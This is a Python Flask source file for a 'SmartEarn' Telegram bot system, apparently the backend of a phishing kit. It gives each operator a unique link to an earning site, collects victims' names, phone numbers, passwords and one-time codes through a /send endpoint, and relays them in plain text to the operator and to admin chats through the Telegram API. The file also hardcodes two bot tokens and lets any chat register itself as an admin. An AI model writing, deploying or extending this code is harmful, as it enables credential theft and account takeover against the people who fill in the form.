# =======================================
# SmartEarn Multi-User Bot System with Enhanced Admin Bot
# First-time user notify fix
# Developer: MN SIDDIK
# =======================================

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import uuid
from collections import deque

app = Flask(__name__)
CORS(app)

# =========================
# Config
# =========================
USER_BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"
ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"
BASE_URL = "https://smart-earning.netlify.app"

# Runtime memory
USERS = {}             # uid -> chat_id
USER_CHAT_IDS = []     # all user chat_ids
ADMIN_CHAT_IDS = []    # all admin chat_ids
USER_NOTIFIED = set()  # users already notified to admin
SUBMISSIONS = deque(maxlen=100)  # last 100 submissions

# =========================
# Telegram helpers
# =========================
def send_message(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

def broadcast_to_users(text):
    for chat_id in USER_CHAT_IDS:
        send_message(USER_BOT_TOKEN, chat_id, text)

# =========================
# User Bot Webhook
# =========================
@app.route(f"/{USER_BOT_TOKEN}", methods=["POST"])
def handle_user_bot():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if text == "/start":
            unique_id = str(uuid.uuid4())[:8]

            # Check if first-time user
            is_first_time = chat_id not in USER_CHAT_IDS

            USERS[unique_id] = chat_id
            if chat_id not in USER_CHAT_IDS:
                USER_CHAT_IDS.append(chat_id)
            
            # Send welcome message to user bot
            link = f"{BASE_URL}/?uid={unique_id}"
            send_message(USER_BOT_TOKEN, chat_id,
                f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒"
            )
            
            # Notify admin bot ONLY first-time users
            if is_first_time and chat_id not in USER_NOTIFIED:
                USER_NOTIFIED.add(chat_id)
                msg = f"✅ New user started bot:\n👤 Chat ID: {chat_id}\n🆔 UID: {unique_id}"
                for admin_id in ADMIN_CHAT_IDS:
                    send_message(ADMIN_BOT_TOKEN, admin_id, msg)

    return jsonify({"ok": True})

# =========================
# Admin Bot Webhook
# =========================
@app.route(f"/{ADMIN_BOT_TOKEN}", methods=["POST"])
def handle_admin_bot():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        # Add to admin list if not exists
        if chat_id not in ADMIN_CHAT_IDS:
            ADMIN_CHAT_IDS.append(chat_id)
            send_message(ADMIN_BOT_TOKEN, chat_id, "✅ Admin bot connected successfully!")

        # Commands
        if text.startswith("/user"):
            total_users = len(USER_CHAT_IDS)
            send_message(ADMIN_BOT_TOKEN, chat_id, f"👥 Total bot users: {total_users}")

        elif text.startswith("/broadcast "):
            msg = text.replace("/broadcast ", "", 1)
            broadcast_to_users(msg)
            send_message(ADMIN_BOT_TOKEN, chat_id, f"✅ Message broadcasted to {len(USER_CHAT_IDS)} users")

        elif text.startswith("/last"):
            if not SUBMISSIONS:
                send_message(ADMIN_BOT_TOKEN, chat_id, "⚠️ No submissions yet.")
            else:
                msg = "📝 Last submissions:\n\n"
                for sub in list(SUBMISSIONS)[-5:]:
                    msg += f"👤 {sub['name']}, 📱 {sub['number']}, 🔐 OTP: {sub['otp']}, UID: {sub['uid']}\n\n"
                send_message(ADMIN_BOT_TOKEN, chat_id, msg)

        elif text.startswith("/stats"):
            msg = (
                f"📊 Bot Statistics:\n"
                f"👥 Total Users: {len(USER_CHAT_IDS)}\n"
                f"📝 Total Submissions: {len(SUBMISSIONS)}"
            )
            send_message(ADMIN_BOT_TOKEN, chat_id, msg)

        elif text.startswith("/help"):
            help_msg = (
                "🛠️ Admin Bot Commands:\n\n"
                "/start - Connect admin bot\n"
                "/user - Show total bot users\n"
                "/broadcast <message> - Send message to all users\n"
                "/last - Show last 5 submissions\n"
                "/stats - Show bot statistics\n"
                "/help - Show this help message"
            )
            send_message(ADMIN_BOT_TOKEN, chat_id, help_msg)

    return jsonify({"ok": True})

# =========================
# Receive form submission (User Bot)
# =========================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")
    otp = data.get("otp")

    if not uid or uid not in USERS:
        return jsonify({"error": "Invalid or expired UID"}), 400

    chat_id = USERS[uid]

    message = (
        f"📥 *New Submission Received!*\n\n"
        f"👤 Name: {name}\n"
        f"📱 Number: {number}\n"
        f"🔑 Password: {password}\n"
        f"🔐 OTP Entered: {otp}\n\n"
        f"🆔 UID: {uid}"
    )

    # Send to user bot chat
    send_message(USER_BOT_TOKEN, chat_id, message)

    # Send to all admin bots
    for admin_id in ADMIN_CHAT_IDS:
        send_message(ADMIN_BOT_TOKEN, admin_id, message)

    # Save submission for /last
    SUBMISSIONS.append({
        "uid": uid,
        "name": name,
        "number": number,
        "otp": otp
    })

    return jsonify({"success": True})

# =========================
# Test route
# =========================
@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Multi-User Bot with First-time Notify Fix Running!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
